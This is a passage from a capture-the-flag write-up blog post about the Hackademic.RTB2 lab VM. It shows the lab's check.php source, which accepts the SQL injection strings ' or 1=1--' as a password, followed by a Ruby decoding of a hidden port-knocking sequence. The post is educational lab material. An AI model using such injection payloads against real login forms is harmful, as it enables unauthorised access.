<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1"># cat /var/www/welcome/check.php</span>
</span><span class='line'><span class="nx">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">welcome</span><span class="o">/</span><span class="nx">check</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=UTF-8&quot;</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">Hackademic</span><span class="o">.</span><span class="nx">RTB2</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">body</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;black&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;hackademicrtb2.png&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="s2">&quot;green&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$pass_answer</span> <span class="o">=</span> <span class="s2">&quot;&#39; or 1=1--&#39;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$pass_answer_2</span> <span class="o">=</span> <span class="s2">&quot;&#39; OR 1=1--&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$pass_answer</span> <span class="k">or</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$pass_answer_2</span><span class="p">){</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;h2&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;Ok, nice shot...&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;/h2&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;...but, you are looking in a wrong place bro! ;-)&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;font color=&quot;black&quot;&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;/font color=&quot;black&quot;&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;h2&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;You are trying to login with wrong credentials!&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s1">&#39;&lt;/h2&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Please try again...&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>After decoding the hex characters and converting binary digits in ruby:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>irb(main):017:0>  [0b00110001, 0b00110000, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110001, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110001, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110000, 0b00110001].map{|x|x.chr}.join
</span><span class='line'>=> "1001:1101:1011:1001"</span></code></pre></td></tr></table></div></figure>


<p>So the SQLi test is validated using string compare operator and it&rsquo;s quite
non-realistic (and unfair) to have two statements with the different case, that
was the reason why we didn&rsquo;t found out this firstly.</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/4">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/2">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    




  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Norbert Szetei -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
